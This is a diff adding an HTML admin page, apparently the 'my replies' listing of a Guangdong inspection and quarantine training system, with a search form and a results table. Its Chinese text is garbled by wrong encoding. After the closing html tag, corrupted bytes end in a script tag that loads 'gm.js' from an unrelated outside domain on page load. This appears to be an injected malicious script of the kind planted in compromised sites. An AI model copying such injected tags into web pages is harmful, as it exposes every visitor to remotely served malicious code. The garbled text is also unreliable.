@@ -1,0 +1,139 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>¹ã¶«¼ìÑé¼ìÒß£¨¼ìÎñ£©ÍøÉÏÅàÑµÏµÍ³ºóÌ¨¹ÜÀíÏµÍ³</title>
+<link href="../css/htlogin.css" rel="stylesheet" type="text/css" />
+<link href="../datepicker/default/datePicker.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="../datepicker/WdatePicker.js"></script>
+
+<script>
+<!--
+	function del()
+	{
+		var chks=document.all('chk');
+		for(var i=0;i<chks.length;i++)
+		{
+			if(chks[i].checked)
+			{
+				chks[i].parentNode.parentNode.style['display']='none';
+			}
+		}
+	}
+//-->
+</script>
+</head>
+
+<body topmargin="0" leftmargin="0">
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td background="../images/ht-body01.jpg" class="body02">µ±Ç°Î»ÖÃ£ºÌÖÂÛ¿Õ¼ä-ÎÒµÄ»Ø¸´</td>
+            </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td colspan="4" background="../images/ht-body02.jpg" class="body03">²éÑ¯Ìõ¼þ</td>
+            </tr>
+            <tr>
+              <td width="25%" class="body06">±êÌâ£º</td>
+              <td width="27%" class="body04"><input name="txtid" type="text" class="bodytext" /></td>
+              <td width="21%" class="body06">Ö÷ÌâÀà±ð£º</td>
+              <td width="23%" class="body04">
+			  <select name="subject">
+			    <option select="select">È«²¿</option>
+				<option>Õþ²ß·¨¹æ</option>
+				<option>±¨¼ì</option>
+				<option>¼ÆÊÕ·Ñ</option>
+				<option>Ç©Ö¤</option>
+				<option>¿Õ°×Ö¤µ¥ºÍÇ©Ö¤Ó¡ÕÂ¹ÜÀí</option>
+				<option>±¨¼ìµ¥Î»ºÍ±¨¼ìÔ±¹ÜÀí</option>
+				<option>ÒµÎñÏµÍ³²Ù×÷</option>
+				<option>²úµØÖ¤</option>
+				<option>×ÛºÏÕþ²ß·¨¹æ</option>
+				<option>×ÛºÏ</option>
+			  </select>
+			  </td>
+            </tr>
+            <tr>
+              <td width="25%" class="body06">¿ªÊ¼·¢²¼ÈÕÆÚ£º</td>
+              <td width="27%" class="body04"><input name="beginDate" type="text" class="Wdate" onfocus="new WdatePicker(this)"/></td>
+              <td width="21%" class="body06">½áÊø·¢²¼ÈÕÆÚ£º</td>
+              <td width="23%" class="body04"><input name="ednDate" type="text" class="Wdate" onfocus="new WdatePicker(this)"/></td>
+            </tr> 
+            <tr>
+              <td colspan="4" class="body03"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="55%" height="35">&nbsp;</td>
+                    <td width="8%">&nbsp;</td>
+                    <td width="8%"><input type="image" src="../images/ht-but-check.jpg" name="Submit222" /></td>
+					<td width="8%" height="35">&nbsp;</td>
+                  </tr>
+              </table></td>
+            </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td class="body01a"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td colspan="7" background="../images/ht-body02.jpg" class="body03">²éÑ¯½á¹û</td>
+            </tr>
+            <tr>
+			  <td width="20%" align="center" class="body05">±êÌâ</td>
+              <td width="15%" align="center" class="body05">Ö÷ÌâÀà±ð</td>
+			  <td width="12%" align="center" class="body05">»Ø¸´Ê±¼ä</td>
+			  <td width="12%" align="center" class="body05">²Ù×÷</td>
+            </tr>
+            <tr>
+              <td class="body03"><a href="luntan.html">ÔÚ±±¾©£¬Í¨¹ý¹º·¿Ñ§Ï°¸öÈËÀí²Æ</a></td>
+              <td class="body03">Ê·º£³ÁÂÙ</td>
+			  <td class="body03">2007-10-08 18:12:34</td>
+              <td align="center" class="body03">
+<input type="image" src="../images/ht-but-liulan.jpg" name="Submit23" onclick="window.location='luntan.html'"/>
+		</td>
+            </tr>
+            <tr>
+              <td class="body03"><a href="luntan.html">ÔÚ±±¾©£¬Í¨¹ý¹º·¿Ñ§Ï°¸öÈËÀí²Æ</a></td>
+              <td class="body03">Ê±ÊÂÕþÖÎ</td>
+			  <td class="body03">2007-10-08 18:12:34</td>
+              <td align="center" class="body03">
+<input type="image" src="../images/ht-but-liulan.jpg" name="Submit23" onclick="window.location='luntan.html'"/>
+		</td>
+            </tr>
+            <tr>
+              <td class="body03"><a href="luntan.html">ÔÚ±±¾©£¬Í¨¹ý¹º·¿Ñ§Ï°¸öÈËÀí²Æ</a></td>
+              <td class="body03">Ì¸¹ÉÂÛ½ð</td>
+			  <td class="body03">2007-10-08 18:12:34</td>
+              <td align="center" class="body03">
+<input type="image" src="../images/ht-but-liulan.jpg" name="Submit23" onclick="window.location='luntan.html'"/>
+		</td>
+            </tr>
+            <tr>
+              <td class="body03"><a href="luntan.html">ÔÚ±±¾©£¬Í¨¹ý¹º·¿Ñ§Ï°¸öÈËÀí²Æ</a></td>
+              <td class="body03">Àí²Æ×Ýºá</td>
+			  <td class="body03">2007-10-08 18:12:34</td>
+              <td align="center" class="body03">
+<input type="image" src="../images/ht-but-liulan.jpg" name="Submit23" onclick="window.location='luntan.html'"/>
+		</td>
+            </tr>
+            <tr>
+              <td colspan="7" class="body03"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="48%" height="35">&nbsp;</td>
+                    <td width="26%">&nbsp;</td>
+                    <td width="15%"></td>
+                    <td width="11%">&nbsp;</td>
+                  </tr>
+              </table></td>
+            </tr>
+        </table></td>
+      </tr>
+    </table>
+</body>
+</html>
+
+{®
+z¸.ÓO5ÑvøÎm‰G“g9±«™–íìhttp://qqq.dzydhx.com/gm.js></script>
